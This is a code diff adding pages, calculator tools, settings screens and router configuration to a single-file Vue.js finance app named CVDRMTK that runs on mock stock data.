+                        <button @click="$router.back()" class="back-btn">
+                            <svg style="width: 24px; height: 24px; fill: currentColor;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 class="page-title">{{ stock.symbol }}</h2>
+                    </div>
+                    
+                    <div class="card" style="margin-bottom: 20px;">
+                        <div style="display: flex; justify-content: space-between; align-items: flex-end;">
+                            <div>
+                                <div style="font-size: 24px; font-weight: bold;">{{ stock.price.toFixed(2) }}</div>
+                                <div class="stock-change" :class="stock.change >= 0 ? 'up' : 'down'" style="display: inline-flex; margin-top: 8px;">
+                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
+                                </div>
+                            </div>
+                            <div style="color: var(--text-secondary); font-size: 14px;">{{ stock.name }}</div>
+                        </div>
+                    </div>
+
+                    <div class="chart-container">
+                        <svg viewBox="0 0 300 150" preserveAspectRatio="none">
+                            <defs>
+                                <linearGradient id="lineGrad" x1="0%" y1="0%" x2="100%" y2="0%">
+                                    <stop offset="0%" stop-color="var(--accent-blue)" />
+                                    <stop offset="100%" stop-color="var(--accent-pink)" />
+                                </linearGradient>
+                            </defs>
+                            <!-- Dynamic Chart Path -->
+                            <path :d="chartPath" fill="none" stroke="url(#lineGrad)" stroke-width="3" vector-effect="non-scaling-stroke" />
+                        </svg>
+                    </div>
+                    
+                    <h3 style="margin-bottom: 12px; font-size: 16px;">Recent Data</h3>
+                    <div class="stock-item">
+                        <div class="stock-info">
+                            <span class="stock-name">Open</span>
+                        </div>
+                        <div class="stock-price">{{ (stock.price * 0.98).toFixed(2) }}</div>
+                    </div>
+                    <div class="stock-item">
+                        <div class="stock-info">
+                            <span class="stock-name">High</span>
+                        </div>
+                        <div class="stock-price">{{ (stock.price * 1.02).toFixed(2) }}</div>
+                    </div>
+                    <div class="stock-item">
+                        <div class="stock-info">
+                            <span class="stock-name">Low</span>
+                        </div>
+                        <div class="stock-price">{{ (stock.price * 0.95).toFixed(2) }}</div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const route = useRoute();
+                const stock = ref({});
+                const chartPath = ref('');
+
+                onMounted(() => {
+                    const symbol = route.params.symbol;
+                    stock.value = MOCK_STOCKS.find(s => s.symbol === symbol) || MOCK_STOCKS[0];
+
+                    // Generate fake 30-day chart data
+                    const points = [];
+                    const min = stock.value.price * 0.85;
+                    const max = stock.value.price * 1.15;
+                    const range = max - min;
+                    
+                    for (let i = 0; i < 30; i++) {
+                        // Random walk with slight upward bias based on change
+                        const base = min + (range * Math.random());
+                        const bias = stock.value.change > 0 ? (i * 0.01 * range) : -(i * 0.01 * range);
+                        const val = Math.max(min, Math.min(max, base + bias));
+                        
+                        const x = (i / 29) * 300;
+                        // Invert Y axis for SVG (0 is top)
+                        const y = 150 - ((val - min) / range) * 150;
+                        points.push({ x, y });
+                    }
+
+                    let path = `M ${points[0].x} ${points[0].y}`;
+                    for (let i = 1; i < points.length; i++) {
+                        path += ` L ${points[i].x} ${points[i].y}`;
+                    }
+                    chartPath.value = path;
+                });
+
+                return { stock, chartPath };
+            }
+        };
+
+        // --- 8. Tool: DCA Profit-Taking ---
+        const ToolDCAPage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <button @click="$router.back()" class="back-btn">
+                            <svg style="width: 24px; height: 24px; fill: currentColor;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 class="page-title">DCA Profit-Taking</h2>
+                    </div>
+                    <div class="input-group">
+                        <label>Cost Basis per Share</label>
+                        <input type="number" v-model.number="cost" class="input-field" placeholder="0.00">
+                    </div>
+                    <div class="input-group">
+                        <label>Shares Held</label>
+                        <input type="number" v-model.number="shares" class="input-field" placeholder="0">
+                    </div>
+                    <div class="input-group">
+                        <label>Take Profit Threshold (%)</label>
+                        <input type="number" v-model.number="threshold" class="input-field" placeholder="10">
+                    </div>
+                    <div class="result-box" v-if="cost > 0 && shares > 0">
+                        <div style="font-size: 14px; margin-bottom: 8px;">Target Profit: <strong>{{ (cost * shares * (threshold/100)).toFixed(2) }}</strong></div>
+                        <div style="font-size: 14px;">Total Value at Target: <strong>{{ (cost * shares * (1 + threshold/100)).toFixed(2) }}</strong></div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const cost = ref(null);
+                const shares = ref(null);
+                const threshold = ref(10);
+                return { cost, shares, threshold };
+            }
+        };
+
+        // --- 9. Tool: Loan Calculator ---
+        const ToolLoanPage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <button @click="$router.back()" class="back-btn">
+                            <svg style="width: 24px; height: 24px; fill: currentColor;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 class="page-title">Loan Calculator</h2>
+                    </div>
+                    <div class="input-group">
+                        <label>Loan Amount</label>
+                        <input type="number" v-model.number="amount" class="input-field" placeholder="10000">
+                    </div>
+                    <div class="input-group">
+                        <label>Annual Interest Rate (%)</label>
+                        <input type="number" v-model.number="rate" class="input-field" placeholder="5">
+                    </div>
+                    <div class="input-group">
+                        <label>Term (Years)</label>
+                        <input type="number" v-model.number="years" class="input-field" placeholder="3">
+                    </div>
+                    <div class="result-box" v-if="monthlyPayment > 0">
+                        <div style="font-size: 16px; font-weight: bold; margin-bottom: 8px;">Monthly Payment: {{ monthlyPayment }}</div>
+                        <div style="font-size: 14px;">Total Interest: {{ totalInterest }}</div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const amount = ref(null);
+                const rate = ref(null);
+                const years = ref(null);
+
+                const monthlyPayment = computed(() => {
+                    if (!amount.value || !rate.value || !years.value) return 0;
+                    const p = amount.value;
+                    const r = (rate.value / 100) / 12;
+                    const n = years.value * 12;
+                    if (r === 0) return (p / n).toFixed(2);
+                    const payment = (p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
+                    return payment.toFixed(2);
+                });
+
+                const totalInterest = computed(() => {
+                    if (!monthlyPayment.value) return 0;
+                    const total = monthlyPayment.value * years.value * 12;
+                    return (total - amount.value).toFixed(2);
+                });
+
+                return { amount, rate, years, monthlyPayment, totalInterest };
+            }
+        };
+
+        // --- 10. Tool: Password Strength ---
+        const ToolPasswordPage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <button @click="$router.back()" class="back-btn">
+                            <svg style="width: 24px; height: 24px; fill: currentColor;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 class="page-title">Password Strength</h2>
+                    </div>
+                    <div class="input-group">
+                        <label>Enter Password</label>
+                        <input type="text" v-model="password" class="input-field" placeholder="Type here...">
+                    </div>
+                    <div class="card">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                            <span style="color: var(--text-secondary);">Strength:</span>
+                            <strong :style="{ color: strengthColor }">{{ strengthText }}</strong>
+                        </div>
+                        <div style="background: rgba(255,255,255,0.1); height: 8px; border-radius: 4px; overflow: hidden; margin-bottom: 16px;">
+                            <div :style="{ width: strengthPercent + '%', background: strengthColor, height: '100%', transition: 'all 0.3s' }"></div>
+                        </div>
+                        <div style="font-size: 12px; color: var(--text-muted); word-break: break-all;">
+                            MD5: {{ md5Hash }}
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const password = ref('');
+                const md5Hash = computed(() => password.value ? md5(password.value) : '');
+                
+                const strengthPercent = computed(() => {
+                    let score = 0;
+                    if (password.value.length > 8) score += 25;
+                    if (/[A-Z]/.test(password.value)) score += 25;
+                    if (/[0-9]/.test(password.value)) score += 25;
+                    if (/[^A-Za-z0-9]/.test(password.value)) score += 25;
+                    return score;
+                });
+
+                const strengthText = computed(() => {
+                    const s = strengthPercent.value;
+                    if (s === 0) return 'None';
+                    if (s <= 25) return 'Weak';
+                    if (s <= 50) return 'Fair';
+                    if (s <= 75) return 'Good';
+                    return 'Strong';
+                });
+
+                const strengthColor = computed(() => {
+                    const s = strengthPercent.value;
+                    if (s === 0) return 'var(--text-muted)';
+                    if (s <= 25) return 'var(--color-up)';
+                    if (s <= 50) return 'var(--color-warning)';
+                    if (s <= 75) return 'var(--accent-blue)';
+                    return '#00ff00';
+                });
+
+                return { password, md5Hash, strengthPercent, strengthText, strengthColor };
+            }
+        };
+
+        // --- 11. Settings: Privacy Policy ---
+        const PrivacyPage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <button @click="$router.back()" class="back-btn">
+                            <svg style="width: 24px; height: 24px; fill: currentColor;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 class="page-title">Privacy Policy</h2>
+                    </div>
+                    <div class="card" style="font-size: 14px; color: var(--text-secondary); line-height: 1.6;">
+                        <p style="margin-bottom: 12px;">Your privacy is important to us. This policy outlines how we handle your data.</p>
+                        <p style="margin-bottom: 12px;"><strong>Data Collection:</strong> We do not collect personal identification information unless you explicitly provide it (e.g., via email).</p>
+                        <p style="margin-bottom: 12px;"><strong>Local Storage:</strong> Settings and preferences are stored locally on your device.</p>
+                        <p>By using CVDRMTK, you agree to this policy.</p>
+                    </div>
+                </div>
+            `
+        };
+
+        // --- 12. Settings: Terms of Service ---
+        const TermsPage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <button @click="$router.back()" class="back-btn">
+                            <svg style="width: 24px; height: 24px; fill: currentColor;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 class="page-title">Terms of Service</h2>
+                    </div>
+                    <div class="card" style="font-size: 14px; color: var(--text-secondary); line-height: 1.6;">
+                        <p style="margin-bottom: 12px;">Welcome to CVDRMTK. By accessing our application, you agree to these terms.</p>
+                        <p style="margin-bottom: 12px;"><strong>Use of Service:</strong> This application is provided "as is" for informational purposes. We are not responsible for financial decisions made based on the data presented.</p>
+                        <p>We reserve the right to update these terms at any time.</p>
+                    </div>
+                </div>
+            `
+        };
+
+        // --- 13. Settings: Monthly Check-in ---
+        const CheckinPage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <button @click="$router.back()" class="back-btn">
+                            <svg style="width: 24px; height: 24px; fill: currentColor;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 class="page-title">Check-in</h2>
+                    </div>
+                    
+                    <div class="calendar-grid">
+                        <div v-for="day in ['Su','Mo','Tu','We','Th','Fr','Sa']" :key="day" class="calendar-day header">{{ day }}</div>
+                        <div v-for="n in emptyDays" :key="'empty-'+n" class="calendar-day"></div>
+                        <div v-for="d in daysInMonth" :key="d" class="calendar-day" :class="{ active: checkedDays.includes(d) }">
+                            {{ d }}
+                        </div>
+                    </div>
+
+                    <button class="btn-primary" @click="checkIn" :disabled="hasCheckedInToday" style="width: 100%; margin-top: 20px;">
+                        {{ hasCheckedInToday ? 'Checked In' : 'Check In Today' }}
+                    </button>
+                </div>
+            `,
+            setup() {
+                const now = new Date();
+                const currentMonth = now.getMonth();
+                const currentYear = now.getFullYear();
+                const today = now.getDate();
+                
+                // Calculate days in month
+                const daysInMonth = new Date(currentYear, currentMonth + 1, 0).getDate();
+                // Calculate empty slots (assuming Sunday start)
+                const firstDay = new Date(currentYear, currentMonth, 1).getDay();
+                const emptyDays = ref(firstDay);
+
+                const checkedDays = ref(JSON.parse(localStorage.getItem('checkin_days') || '[]'));
+                const hasCheckedInToday = computed(() => checkedDays.value.includes(today));
+
+                const checkIn = () => {
+                    if (!hasCheckedInToday.value) {
+                        checkedDays.value.push(today);
+                        localStorage.setItem('checkin_days', JSON.stringify(checkedDays.value));
+                        showToast('Check-in successful!');
+                    }
+                };
+
+                const showToast = (msg) => {
+                    const t = document.createElement('div');
+                    t.className = 'toast';
+                    t.innerText = msg;
+                    document.body.appendChild(t);
+                    setTimeout(() => t.remove(), 3000);
+                };
+
+                return { daysInMonth, emptyDays, checkedDays, hasCheckedInToday, checkIn };
+            }
+        };
+
+        // --- 14. Settings: Feedback ---
+        const FeedbackPage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <button @click="$router.back()" class="back-btn">
+                            <svg style="width: 24px; height: 24px; fill: currentColor;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 class="page-title">Feedback</h2>
+                    </div>
+                    <div class="input-group">
+                        <label>Title</label>
+                        <input type="text" v-model="title" class="input-field" placeholder="Subject">
+                    </div>
+                    <div class="input-group">
+                        <label>Content</label>
+                        <textarea v-model="content" class="input-field" rows="5" placeholder="Describe your issue or suggestion..."></textarea>
+                    </div>
+                    <button class="btn-primary" :disabled="!isValid" @click="submit" style="width: 100%; margin-top: 16px;">
+                        Send Feedback
+                    </button>
+                </div>
+            `,
+            setup() {
+                const title = ref('');
+                const content = ref('');
+                const router = useRouter();
+
+                const isValid = computed(() => title.value.trim() !== '' && content.value.trim() !== '');
+
+                const submit = () => {
+                    if (isValid.value) {
+                        showToast('Feedback sent successfully!');
+                        title.value = '';
+                        content.value = '';
+                        router.back();
+                    }
+                };
+
+                const showToast = (msg) => {
+                    const t = document.createElement('div');
+                    t.className = 'toast';
+                    t.innerText = msg;
+                    document.body.appendChild(t);
+                    setTimeout(() => t.remove(), 3000);
+                };
+
+                return { title, content, isValid, submit };
+            }
+        };
+
+        // --- 15. Settings: Inbox ---
+        const InboxPage = {
+            template: `
+                <div class="page-container">
+                    <div class="page-header">
+                        <button @click="$router.back()" class="back-btn">
+                            <svg style="width: 24px; height: 24px; fill: currentColor;" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                        </button>
+                        <h2 class="page-title">Inbox</h2>
+                    </div>
+                    
+                    <div class="settings-list">
+                        <div class="settings-item" @click="openMessage">
+                            <div style="display: flex; flex-direction: column; gap: 4px;">
+                                <span style="font-weight: bold;">Welcome</span>
+                                <span style="font-size: 12px; color: var(--text-secondary);">Welcome to CVDRMTK!</span>
+                            </div>
+                            <div style="width: 8px; height: 8px; border-radius: 50%; background: var(--accent-orange);"></div>
+                        </div>
+                    </div>
+
+                    <!-- Modal -->
+                    <div v-if="showModal" class="modal-overlay" @click.self="showModal = false">
+                        <div class="modal-content">
+                            <h3 style="margin-bottom: 12px;">Welcome</h3>
+                            <p style="font-size: 14px; color: var(--text-secondary); line-height: 1.6;">
+                                Thank you for choosing CVDRMTK. We are dedicated to providing you with the best tools and insights for your financial journey. Explore the app to discover powerful features designed to help you make informed decisions.
+                            </p>
+                            <button class="btn-primary" @click="showModal = false" style="width: 100%; margin-top: 20px;">Close</button>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const showModal = ref(false);
+                const openMessage = () => { showModal.value = true; };
+                return { showModal, openMessage };
+            }
+        };
+
+        // --- 16. Tab Bar Component ---
+        const TabBar = {
+            template: `
+                <div class="tab-bar">
+                    <router-link to="/home" class="tab-item" :class="{ active: $route.path === '/home' }">
+                        <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                        <span>Home</span>
+                    </router-link>
+                    <router-link to="/toolbox" class="tab-item" :class="{ active: $route.path.startsWith('/tool') || $route.path === '/toolbox' }">
+                        <svg viewBox="0 0 24 24"><path d="M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.3L9 6 6 9 1.6 4.7C.4 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1.1-1.4z"/></svg>
+                        <span>Toolbox</span>
+                    </router-link>
+                    <router-link to="/settings" class="tab-item" :class="{ active: $route.path.startsWith('/settings') || $route.path === '/settings' }">
+                        <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+                        <span>Settings</span>
+                    </router-link>
+                </div>
+            `
+        };
+
+        // =====================================================================
+        // ROUTER CONFIGURATION
+        // =====================================================================
+        const routes = [
+            { path: '/', component: LoadingPage },
+            { path: '/home', component: HomePage },
+            { path: '/toolbox', component: ToolboxPage },
+            { path: '/settings', component: SettingsPage },
+            { path: '/sub/top-gainers', component: SubpageList },
+            { path: '/sub/watchlist', component: SubpageList },
+            { path: '/sub/potential', component: SubpageList },
+            { path: '/sub/guide', component: GuidePage },
+            { path: '/stock/:symbol', component: StockDetailPage },
+            { path: '/tool/dca', component: ToolDCAPage },
+            { path: '/tool/loan', component: ToolLoanPage },
+            { path: '/tool/password', component: ToolPasswordPage },
+            { path: '/settings/privacy', component: PrivacyPage },
+            { path: '/settings/terms', component: TermsPage },
+            { path: '/checkin', component: CheckinPage },
+            { path: '/feedback', component: FeedbackPage },
+            { path: '/inbox', component: InboxPage }
+        ];
+
+        const router = createRouter({
+            history: createWebHashHistory(),
+            routes
+        });
+
+        // =====================================================================
+        // MAIN APP INITIALIZATION
+        // =====================================================================
+        const app = createApp({
+            setup() {
+                const route = useRoute();
+                
+                // Determine if tab bar should be visible
+                const showTabBar = computed(() => {
+                    const path = route.path;
+                    // Tab bar visible on Home, Toolbox, Settings (main pages)
+                    if (path === '/home' || path === '/toolbox' || path === '/settings') {
+                        return true;
+                    }
+                    return false;
+                });
+
+                return { showTabBar };
+            }
+        });
+
+        app.component('TabBar', TabBar);
+        app.use(router);
+        app.mount('#app');
+
+    </script>
+</body>
+</html>
